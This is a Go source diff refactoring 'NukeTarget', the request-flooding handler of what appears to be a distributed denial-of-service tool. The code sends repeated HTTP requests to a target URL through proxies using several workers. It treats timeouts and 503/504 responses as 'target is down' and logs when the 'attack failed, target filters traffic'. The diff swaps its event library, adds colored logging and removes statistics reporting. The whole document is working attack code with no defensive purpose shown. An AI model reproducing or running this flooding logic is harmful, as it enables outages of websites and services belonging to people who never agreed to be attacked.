@@ -3,34 +3,42 @@ package handler
 import (
 	"bytes"
 	"context"
-	"encoding/json"
 	"io"
+	"log"
 	"net/http"
 	"os"
 	"syscall"
 
+	logw "github.com/andriiyaremenko/logwriter"
+	"github.com/andriiyaremenko/logwriter/color"
 	"github.com/andriiyaremenko/mg/client"
 	"github.com/andriiyaremenko/mg/dto"
-	"github.com/andriiyaremenko/tinycqs/command"
+	"github.com/andriiyaremenko/pipelines"
 	"github.com/pkg/errors"
 )
 
-func NukeTarget(amountRequests int64, agentUID string) command.Handler {
-	return &command.BaseHandler{
-		Type: "NUKE_TARGET",
-		HandleFunc: func(ctx context.Context, w command.EventWriter, e command.Event) {
-			defer w.Done()
-
+func NukeTarget(
+	log *log.Logger,
+	agentUID string,
+	numWorkers int,
+	amountRequests int64,
+) pipelines.Handler[dto.Target, dto.TargetResponse] {
+	return &pipelines.BaseHandler[dto.Target, dto.TargetResponse]{
+		NWorkers: numWorkers,
+		HandleFunc: func(ctx context.Context, w pipelines.EventWriter[dto.TargetResponse], e pipelines.Event[dto.Target]) {
 			select {
 			case <-ctx.Done():
 				return
 			default:
 			}
 
-			p := e.Payload()
-			target := new(dto.Target)
-			if err := json.Unmarshal(p, target); err != nil {
-				w.Write(command.NewErrEvent(e, errors.Wrap(err, "bad target record")))
+			target := e.Payload
+
+			client, err := client.WithProxy(target.Proxy)
+			if err != nil {
+				w.Write(pipelines.NewErr[dto.TargetResponse](
+					errors.Wrapf(err, "bad target proxy record: %s", target.Proxy),
+				))
 				return
 			}
 
@@ -42,13 +50,19 @@ func NukeTarget(amountRequests int64, agentUID string) command.Handler {
 				default:
 				}
 
-				resp, err := sendRequest(target)
+				resp, err := sendRequest(client, &target)
+				targetResp := dto.TargetResponse{Target: target}
 
 				if errors.Is(err, context.DeadlineExceeded) || os.IsTimeout(err) {
 					hits++
 
-					writeTargetIsDown(w, target, agentUID, p)
-					collectStatistic(w, agentUID, target.ID, 0, 1)
+					log.Println(
+						logw.Debug.
+							WithString("target", target.URL).
+							WithString("error", err.Error()),
+						color.ColorizeText(color.ANSIColorGreen, "target is down"),
+					)
+					w.Write(pipelines.NewErrEvent(targetResp, errors.Wrap(err, "target is down")))
 
 					if hits >= 5 {
 						return
@@ -57,33 +71,46 @@ func NukeTarget(amountRequests int64, agentUID string) command.Handler {
 					continue
 				}
 
-				if errors.Is(err, io.EOF) || errors.Is(err, syscall.ECONNRESET) {
-					w.Write(
-						command.NewErrEvent(
-							e,
-							errors.Wrap(err, "attack failed, target filters traffic"),
-						),
+				if errors.Is(err, io.EOF) ||
+					errors.Is(err, syscall.ECONNRESET) ||
+					errors.Is(err, syscall.ECONNREFUSED) {
+					log.Println(
+						logw.Debug.
+							WithString("target", target.URL).
+							WithString("error", err.Error()),
+						color.ColorizeText(color.ANSIColorYellow, "attack failed, target filters traffic"),
 					)
-					collectStatistic(w, agentUID, target.ID, 0, 1)
+					w.Write(pipelines.NewErrEvent(targetResp, errors.Wrap(err, "target filters traffic")))
 
 					return
 				}
 
 				if err != nil {
-					w.Write(command.NewErrEvent(e, errors.Wrap(err, "request failed")))
-					collectStatistic(w, agentUID, target.ID, 0, 1)
+					log.Println(
+						logw.Debug.
+							WithString("target", target.URL).
+							WithString("error", err.Error()),
+						color.ColorizeText(color.ANSIColorRed, "failed request"),
+					)
+					w.Write(pipelines.NewErrEvent(targetResp, errors.Wrap(err, "request failed")))
 
 					continue
 				}
 
 				resp.Body.Close()
 
+				targetResp.Code = resp.StatusCode
+
+				w.Write(pipelines.Event[dto.TargetResponse]{Payload: targetResp})
+
 				if resp.StatusCode == http.StatusServiceUnavailable ||
 					resp.StatusCode == http.StatusGatewayTimeout {
 					hits++
 
-					writeTargetIsDown(w, target, agentUID, p)
-					collectStatistic(w, agentUID, target.ID, 0, 1)
+					log.Println(
+						logw.Debug.WithString("target", target.URL),
+						color.ColorizeText(color.ANSIColorRed, "target is down"),
+					)
 
 					if hits >= 5 {
 						return
@@ -93,46 +120,12 @@ func NukeTarget(amountRequests int64, agentUID string) command.Handler {
 				}
 
 				hits = 0
-				if resp.StatusCode < 500 {
-					w.Write(command.E{
-						Type: "TARGET_ALIVE",
-						P:    p,
-					})
-
-					collectStatistic(w, agentUID, target.ID, 1, 0)
-
-					continue
-				}
-
-				targetErr := dto.TargetError{
-					Target:  *target,
-					ErrCode: resp.StatusCode,
-				}
-
-				b, err := json.Marshal(targetErr)
-				if err != nil {
-					w.Write(command.NewErrEvent(e, errors.Wrap(err, "bad target error record")))
-
-					continue
-				}
-
-				w.Write(command.E{
-					Type: "TARGET_ERROR",
-					P:    b,
-				})
-
-				collectStatistic(w, agentUID, target.ID, 0, 1)
 			}
 		},
 	}
 }
 
-func sendRequest(target *dto.Target) (*http.Response, error) {
-	client, err := client.WithProxy(target.Proxy)
-	if err != nil {
-		return nil, errors.Wrap(err, "bad target proxy record")
-	}
-
+func sendRequest(client *http.Client, target *dto.Target) (*http.Response, error) {
 	var body io.Reader = nil
 
 	if target.Data != nil {
@@ -149,29 +142,4 @@ func sendRequest(target *dto.Target) (*http.Response, error) {
 	}
 
 	return client.Do(req)
-}
-
-func writeTargetIsDown(w command.EventWriter, target *dto.Target, agentUID string, p []byte) {
-	w.Write(command.E{
-		Type: "TARGET_DOWN",
-		P:    p,
-	})
-}
-
-func collectStatistic(w command.EventWriter, agentUID string, targetID int, s, e int64) {
-	st, err := json.Marshal(dto.TargetStatistic{
-		Statistic: dto.Statistic{
-			AgentUID: agentUID,
-			Success:  s,
-			Error:    e,
-		},
-		TargetID: targetID,
-	})
-
-	if err == nil {
-		w.Write(command.E{
-			Type: "COLLECT_STATISTIC",
-			P:    st,
-		})
-	}
 }
